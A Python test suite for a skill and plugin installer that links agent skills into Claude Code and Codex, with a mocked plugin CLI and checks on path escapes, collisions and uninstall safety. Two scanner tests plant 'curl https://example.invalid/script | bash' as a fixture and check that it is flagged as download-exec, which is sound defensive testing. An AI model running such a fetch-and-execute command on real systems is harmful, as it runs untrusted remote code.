"""Hermetic helper tests. Never launches skills.py, an agent CLI, or a hook."""
from __future__ import annotations

import ast
import copy
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
from types import SimpleNamespace
import unittest
from unittest import mock

ENGINE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ENGINE))
from lib.config import load_config
from lib.fanout import load_skills
from lib.fanout_install import State, execute, key, make_plan, unsafe_skills
from lib.plugins import Codex, MANIFESTS, copy_plugin, discover_plugins, fingerprint, read_plugin


def put(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def skill(path, name="demo"):
    put(path / "SKILL.md", f"---\nname: {name}\ndescription: Synthetic fixture.\n---\n# Fixture\n")


def plugin(path, name="package", runtimes=("claude-code", "codex"), custom=False):
    skill(path / "skills/category/demo")
    put(path / "scripts/start.py", "raise AssertionError('hooks must never execute in these tests')\n")
    hook_path = "./hooks/custom.json" if custom else "./hooks/hooks.json"
    hooks = {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command":
             'python "${CLAUDE_PLUGIN_ROOT}/scripts/start.py"'}]}]}}
    put(path / hook_path, json.dumps(hooks))
    for runtime in runtimes:
        manifest = {"name": name, "version": "1.0.0", "skills": ["./skills/category/demo"]}
        if custom:
            manifest["hooks"] = hook_path
        put(path / MANIFESTS[runtime], json.dumps(manifest))
    return path


class NativeFixture:
    """Emulates only the documented Codex plugin JSON protocol, never runs commands."""
    def __init__(self):
        self.markets = []
        self.installed = []
        self.calls = []
        self.fail_add = False

    def factory(self, executable):
        return Codex(executable, runner=self.run)

    def run(self, command, **kwargs):
        assert command[1] == "plugin" and command[-1] == "--json"
        assert kwargs["check"] is False and kwargs["capture_output"] is True
        args = command[2:-1]
        self.calls.append(args)
        if args == ["marketplace", "list"]:
            payload = {"marketplaces": self.markets}
        elif args == ["list"]:
            payload = {"installed": self.installed, "available": []}
        elif args[:2] == ["marketplace", "add"]:
            root = Path(args[2])
            name = json.loads((root / ".agents/plugins/marketplace.json").read_text())["name"]
            self.markets.append({"name": name, "root": str(root)})
            payload = {"marketplaceName": name, "installedRoot": str(root), "alreadyAdded": False}
        elif args[:2] == ["marketplace", "remove"]:
            self.markets[:] = [m for m in self.markets if m["name"] != args[2]]
            payload = {"marketplaceName": args[2]}
        elif args[0] in ("add", "remove"):
            name, marketplace = args[1].split("@")
            if args[0] == "add" and self.fail_add:
                return SimpleNamespace(returncode=1, stdout="", stderr="synthetic add failure")
            self.installed[:] = [p for p in self.installed if (p["name"], p["marketplaceName"]) != (name, marketplace)]
            if args[0] == "add":
                self.installed.append({"name": name, "marketplaceName": marketplace, "installed": True, "enabled": True})
            payload = {"name": name, "marketplaceName": marketplace, "pluginId": args[1]}
        else:
            raise AssertionError(f"unexpected native command: {args}")
        return SimpleNamespace(returncode=0, stdout=json.dumps(payload), stderr="")


class InstallerTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix="brain-plugin-test-")
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name).resolve()
        self.agents = self.root / "agents"
        self.settings = self.root / "home/.claude/settings.json"
        self.cfg = {"paths": {"agents": str(self.agents), "brain": str(self.root)},
                    "engine": {"fanout": {"mode": "symlink", "state": str(self.root / "state.json"),
                    "targets": {"claude-code": str(self.root / "home/.claude/skills"),
                                "codex-dir": str(self.root / "home/.agents/skills")},
                    "plugins": {"claude-code": {"runtime": "claude-code"},
                                "codex-dir": {"runtime": "codex", "marketplace_name": "brain-test",
                                              "marketplace": str(self.root / "market place"),
                                              "executable": "mock-codex"}}}}}
        self.native = NativeFixture()
        self.guard = mock.patch("subprocess.run", side_effect=AssertionError("live subprocess forbidden"))
        self.guard.start()
        self.addCleanup(self.guard.stop)
        self.environment = mock.patch.dict(os.environ, {"HOME": str(self.root / "home"),
            "CODEX_HOME": str(self.root / "home/.codex"), "CLAUDE_CONFIG_DIR": str(self.root / "home/.claude")})
        self.environment.start()
        self.addCleanup(self.environment.stop)

    def plan(self, **kwargs):
        return make_plan(self.cfg, settings=self.settings, **kwargs)

    def apply(self, **kwargs):
        plan = self.plan(**kwargs)
        self.assertFalse(plan.blocked, plan.reports)
        execute(plan, codex_factory=self.native.factory)
        return plan

    def test_directory_discovery_without_index(self):
        skill(self.agents / "skills/demo")
        skill(self.agents / "skills/.hidden", ".hidden")
        plugin(self.agents / "skills/wrong-place")
        put(self.agents / "skills/skills.toml", "this is deliberately invalid TOML")
        self.assertEqual(set(load_skills(self.cfg)), {"demo"})

    def test_standalone_scan_prunes_git_directory(self):
        source = self.agents / "skills/demo"
        skill(source)
        git = source / ".git"
        git.mkdir()
        (git / "index").write_bytes(bytes(range(256)))
        put(git / "hooks/example", "curl https://example.invalid/script | bash")
        original = os.scandir
        def scan(path):
            if Path(path).name == ".git":
                raise AssertionError("must not traverse Git metadata")
            return original(path)
        with mock.patch("os.scandir", side_effect=scan):
            self.assertEqual(unsafe_skills({"demo": source}), {})

    def test_standalone_scan_skips_git_file_but_keeps_resource_checks(self):
        source = self.agents / "skills/demo"
        skill(source)
        (source / ".git").write_bytes(bytes(range(256)))
        self.assertEqual(unsafe_skills({"demo": source}), {})
        (source / "payload.bin").write_bytes(bytes(range(256)))
        put(source / ".gitignore", "curl https://example.invalid/script | bash")
        issues = unsafe_skills({"demo": source})["demo"]
        self.assertTrue(any("payload.bin" in issue and "non-text-file" in issue for issue in issues))
        self.assertTrue(any(".gitignore" in issue and "download-exec" in issue for issue in issues))

    def test_missing_directories_and_empty_plan(self):
        plan = self.plan()
        self.assertEqual(plan.actions, [])
        execute(plan, codex_factory=self.native.factory)
        self.assertFalse((self.root / "state.json").exists())
        self.assertEqual(self.native.calls, [])

    def test_manifest_names_nested_skills_custom_hooks_and_binary_assets(self):
        path = plugin(self.agents / "plugins/different-folder", name="named-package", custom=True)
        (path / "logo.png").write_bytes(bytes(range(256)))
        result = read_plugin(path, "codex")
        self.assertEqual((result.name, result.skills, result.hooks),
                         ("named-package", ("demo",), ("SessionStart",)))

    def test_plugin_defaults_and_inline_hooks(self):
        path = plugin(self.agents / "plugins/package")
        manifest = path / MANIFESTS["codex"]
        data = json.loads(manifest.read_text())
        del data["skills"]
        data["hooks"] = [{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo done"}]}]}}]
        manifest.write_text(json.dumps(data))
        self.assertEqual(read_plugin(path, "codex").hooks, ("Stop",))
        self.assertEqual(read_plugin(path, "codex").skills, ("demo",))

    def test_unsupported_runtime_is_reported(self):
        plugin(self.agents / "plugins/only-claude", runtimes=("claude-code",))
        plan = self.plan(kind="plugins", targets=["codex-dir"])
        self.assertEqual(plan.actions, [])
        self.assertTrue(any(line.startswith("SKIP") for line in plan.reports))

    def test_duplicate_plugin_names_block_every_copy(self):
        plugin(self.agents / "plugins/first")
        plugin(self.agents / "plugins/second")
        found, reports = discover_plugins(self.agents, "codex")
        self.assertEqual(found, {})
        self.assertTrue(any("duplicate" in line for line in reports))
        self.assertTrue(self.plan(kind="plugins").blocked)

    def test_malformed_manifest_is_reported(self):
        put(self.agents / "plugins/bad/.codex-plugin/plugin.json", "[]")
        self.assertTrue(self.plan(kind="plugins").blocked)

    def test_missing_hook_resource_blocks_install(self):
        path = plugin(self.agents / "plugins/package")
        (path / "scripts/start.py").unlink()
        self.assertTrue(self.plan(kind="plugins").blocked)

    def test_escaping_manifest_path_is_rejected(self):
        path = plugin(self.agents / "plugins/package")
        manifest = path / MANIFESTS["codex"]
        data = json.loads(manifest.read_text())
        data["skills"] = "./../outside"
        (path.parent / "outside").mkdir()
        manifest.write_text(json.dumps(data))
        with self.assertRaisesRegex(ValueError, "escaping"):
            read_plugin(path, "codex")

    def test_symlink_snapshot_preserves_internal_resources(self):
        path = plugin(self.agents / "plugins/package")
        (path / "link.py").symlink_to(path / "scripts/start.py")
        dest = self.root / "snapshot"
        copy_plugin(path, dest)
        self.assertEqual(fingerprint(path), fingerprint(dest))
        self.assertEqual((dest / "link.py").resolve(), dest / "scripts/start.py")

    def test_external_symlink_is_rejected(self):
        path = plugin(self.agents / "plugins/package")
        outside = self.root / "outside"
        outside.write_text("not a plugin resource")
        (path / "external").symlink_to(outside)
        with self.assertRaisesRegex(ValueError, "escapes"):
            fingerprint(path)

    def test_preview_has_no_writes_or_native_calls(self):
        skill(self.agents / "skills/demo")
        plugin(self.agents / "plugins/package")
        before = fingerprint(self.root)
        plan = self.plan()
        self.assertEqual(len(plan.actions), 4)
        self.assertEqual(fingerprint(self.root), before)
        self.assertEqual(self.native.calls, [])
        self.assertFalse(self.settings.exists())

    def test_standalone_links_live_edits_and_settings_merge(self):
        source = self.agents / "skills/demo"
        skill(source)
        put(self.settings, '{"keep": "me"}')
        self.apply(kind="skills")
        dest = self.root / "home/.agents/skills/demo"
        self.assertTrue(dest.is_symlink())
        self.assertEqual(dest.resolve(), source)
        put(source / "notes.txt", "source edit")
        self.assertEqual((dest / "notes.txt").read_text(), "source edit")
        self.assertEqual(json.loads(self.settings.read_text()), {"keep": "me", "skillListingBudgetFraction": 0.025})
        self.assertEqual(self.native.calls, [])

    def test_claude_plugin_links_whole_package_not_inner_skill(self):
        source = plugin(self.agents / "plugins/folder", name="named-package")
        self.apply(kind="plugins", targets=["claude-code"])
        dest = self.root / "home/.claude/skills/named-package"
        self.assertEqual(dest.resolve(), source)
        self.assertTrue((dest / "hooks/hooks.json").exists())
        self.assertFalse((dest.parent / "demo").exists())
        self.assertFalse(self.settings.exists())

    def test_target_filter_and_unknown_target(self):
        skill(self.agents / "skills/demo")
        self.apply(kind="skills", targets=["codex-dir"])
        self.assertFalse((self.root / "home/.claude").exists())
        with self.assertRaisesRegex(ValueError, "unknown target"):
            self.plan(targets=["unknown"])

    def test_unmanaged_collision_blocks_all_writes(self):
        skill(self.agents / "skills/demo")
        dest = self.root / "home/.claude/skills/demo"
        dest.mkdir(parents=True)
        plan = self.plan(kind="skills")
        self.assertTrue(plan.blocked)
        with self.assertRaisesRegex(ValueError, "refusals"):
            execute(plan, codex_factory=self.native.factory)
        self.assertFalse((self.root / "home/.agents").exists())

    def test_skill_plugin_destination_collision(self):
        skill(self.agents / "skills/package", "package")
        plugin(self.agents / "plugins/package")
        self.assertTrue(self.plan(targets=["claude-code"]).blocked)

    def test_copy_idempotence_and_modified_copy_refusal(self):
        self.cfg["engine"]["fanout"]["mode"] = "copy"
        skill(self.agents / "skills/demo")
        self.apply(kind="skills")
        dest = self.root / "home/.agents/skills/demo"
        self.assertFalse(dest.is_symlink())
        self.apply(kind="skills")
        put(dest / "local-change", "preserve me")
        self.assertTrue(self.plan(kind="skills", uninstall=True).blocked)
        self.assertTrue(dest.exists())

    def test_uninstall_after_source_removed_preserves_other_content(self):
        source = self.agents / "skills/demo"
        skill(source)
        self.apply(kind="skills")
        keep = self.root / "home/.agents/skills/unrelated/SKILL.md"
        put(keep, "keep me")
        shutil.rmtree(source)
        self.apply(kind="skills", uninstall=True)
        self.assertFalse((keep.parent.parent / "demo").is_symlink())
        self.assertTrue(keep.exists())
        self.assertEqual(State(self.root / "state.json").entries, {})

    def test_legacy_link_uninstall_without_record(self):
        source = self.agents / "skills/demo"
        skill(source)
        dest = self.root / "home/.agents/skills/demo"
        dest.parent.mkdir(parents=True)
        dest.symlink_to(source)
        self.apply(kind="skills", targets=["codex-dir"], uninstall=True)
        self.assertFalse(dest.is_symlink())
        self.assertTrue(source.exists())

    def test_changed_source_between_plan_and_execution_refused(self):
        source = self.agents / "skills/demo"
        skill(source)
        plan = self.plan(kind="skills")
        put(source / "changed", "changed")
        with self.assertRaisesRegex(ValueError, "source changed"):
            execute(plan, codex_factory=self.native.factory)
        self.assertFalse((self.root / "state.json").exists())

    def test_changed_target_configuration_requires_uninstall(self):
        skill(self.agents / "skills/demo")
        self.apply(kind="skills")
        self.cfg["engine"]["fanout"]["targets"]["codex-dir"] = str(self.root / "new-target")
        self.assertTrue(self.plan(kind="skills").blocked)
        self.apply(kind="skills", uninstall=True)
        self.assertFalse((self.root / "home/.agents/skills/demo").is_symlink())

    def test_root_remapping_cannot_reach_native_installer(self):
        with self.assertRaisesRegex(ValueError, "requires --kind skills"):
            self.plan(root=self.root / "remap")
        skill(self.agents / "skills/demo")
        plan = make_plan(self.cfg, root=self.root / "remap", kind="skills")
        execute(plan, codex_factory=self.native.factory)
        self.assertTrue((self.root / "remap/codex-dir/demo").is_symlink())
        self.assertFalse((self.root / "home").exists())

    def test_native_install_snapshot_and_idempotence(self):
        source = plugin(self.agents / "plugins/package")
        self.apply(kind="plugins", targets=["codex-dir"])
        entry = next(iter(State(self.root / "state.json").entries.values()))
        snapshot = Path(entry["snapshot"])
        self.assertFalse(snapshot.is_symlink())
        self.assertEqual(fingerprint(source), fingerprint(snapshot))
        before = len([c for c in self.native.calls if c[0] == "add"])
        self.apply(kind="plugins", targets=["codex-dir"])
        self.assertEqual(len([c for c in self.native.calls if c[0] == "add"]), before)
        self.assertFalse(self.settings.exists())

    def test_native_source_change_refreshes_cache_without_editing_manifest(self):
        source = plugin(self.agents / "plugins/package")
        original = (source / MANIFESTS["codex"]).read_bytes()
        self.apply(kind="plugins", targets=["codex-dir"])
        old = Path(next(iter(State(self.root / "state.json").entries.values()))["snapshot"])
        put(source / "notes.md", "new content")
        self.apply(kind="plugins", targets=["codex-dir"])
        self.assertIn(["remove", "package@brain-test"], self.native.calls)
        self.assertEqual((source / MANIFESTS["codex"]).read_bytes(), original)
        self.assertFalse(old.exists())

    def test_native_uninstall_preserves_unrelated_plugin_and_file(self):
        source = plugin(self.agents / "plugins/package")
        self.native.installed.append({"name": "unrelated", "marketplaceName": "other", "enabled": True})
        self.apply(kind="plugins", targets=["codex-dir"])
        keep = self.root / "market place/personal-note.txt"
        put(keep, "keep")
        shutil.rmtree(source)
        self.apply(kind="plugins", targets=["codex-dir"], uninstall=True)
        self.assertEqual([p["name"] for p in self.native.installed], ["unrelated"])
        self.assertTrue(keep.exists())
        self.assertEqual(self.native.markets, [])

    def test_native_unmanaged_market_refuses_before_local_writes(self):
        skill(self.agents / "skills/demo")
        plugin(self.agents / "plugins/package")
        self.native.markets.append({"name": "brain-test", "root": str(self.root / "other-market")})
        with self.assertRaisesRegex(ValueError, "unmanaged Codex marketplace"):
            execute(self.plan(), codex_factory=self.native.factory)
        self.assertFalse((self.root / "home").exists())

    def test_native_unmanaged_plugin_is_not_adopted(self):
        plugin(self.agents / "plugins/package")
        self.native.installed.append({"name": "package", "marketplaceName": "brain-test", "enabled": True})
        with self.assertRaisesRegex(ValueError, "unmanaged Codex plugin"):
            execute(self.plan(kind="plugins", targets=["codex-dir"]), codex_factory=self.native.factory)
        self.assertFalse((self.root / "state.json").exists())

    def test_native_failure_leaves_retryable_record(self):
        plugin(self.agents / "plugins/package")
        self.native.fail_add = True
        with self.assertRaisesRegex(RuntimeError, "synthetic add failure"):
            self.apply(kind="plugins", targets=["codex-dir"])
        self.assertEqual(next(iter(State(self.root / "state.json").entries.values()))["status"], "pending")
        self.native.fail_add = False
        self.apply(kind="plugins", targets=["codex-dir"])
        self.assertEqual(next(iter(State(self.root / "state.json").entries.values()))["status"], "installed")

    def test_native_disabled_unchanged_plugin_stays_disabled(self):
        plugin(self.agents / "plugins/package")
        self.apply(kind="plugins", targets=["codex-dir"])
        self.native.installed[0]["enabled"] = False
        self.apply(kind="plugins", targets=["codex-dir"])
        self.assertFalse(self.native.installed[0]["enabled"])

    def test_edited_managed_catalog_is_refused(self):
        plugin(self.agents / "plugins/package")
        self.apply(kind="plugins", targets=["codex-dir"])
        catalog = self.root / "market place/.agents/plugins/marketplace.json"
        data = json.loads(catalog.read_text())
        data["plugins"].append({"name": "foreign"})
        catalog.write_text(json.dumps(data))
        with self.assertRaisesRegex(ValueError, "catalog changed"):
            self.plan(kind="plugins", uninstall=True)

    def test_invalid_native_inventory_and_timeout_stop(self):
        invalid = Codex(runner=lambda *a, **k: SimpleNamespace(returncode=0, stdout="{}", stderr=""))
        with self.assertRaisesRegex(RuntimeError, "inventory"):
            invalid.inventory()
        client = Codex(runner=mock.Mock(side_effect=subprocess.TimeoutExpired("mock", 1)))
        with self.assertRaisesRegex(RuntimeError, "command failed"):
            client.call("list")

    def test_invalid_state_is_rejected(self):
        put(self.root / "state.json", '{"version": 1, "entries": {"bad": {}}, "markets": {}}')
        with self.assertRaisesRegex(ValueError, "invalid installation record"):
            self.plan()

    def test_config_paths_and_runtime_validation(self):
        config = self.root / "config.toml"
        put(config, '''[engine.fanout]
state = "./records/state.json"
[engine.fanout.targets]
custom = "~/skills"
[engine.fanout.plugins.custom]
runtime = "codex"
marketplace_name = "test-market"
marketplace = "./local marketplace"
executable = "./bin/codex"
''')
        fan = load_config(config)["engine"]["fanout"]
        self.assertEqual(fan["state"], str(self.root / "records/state.json"))
        self.assertEqual(fan["plugins"]["custom"]["marketplace"], str(self.root / "local marketplace"))
        self.assertEqual(fan["plugins"]["custom"]["executable"], str(self.root / "bin/codex"))
        config.write_text(config.read_text().replace('runtime = "codex"', 'runtime = "unknown"'))
        with self.assertRaisesRegex(ValueError, "runtime"):
            load_config(config)

    def test_cli_is_explicitly_gated_without_importing_or_running_it(self):
        tree = ast.parse((ENGINE / "install/skills.py").read_text())
        gates = [n for n in ast.walk(tree) if isinstance(n, ast.If)
                 and ast.unparse(n.test) == "args.apply and (not args.dry_run)"]
        self.assertEqual(len(gates), 1)
        calls = [n for n in ast.walk(gates[0]) if isinstance(n, ast.Call)
                 and isinstance(n.func, ast.Name) and n.func.id == "execute"]
        self.assertEqual(len(calls), 1)


if __name__ == "__main__":
    unittest.main()
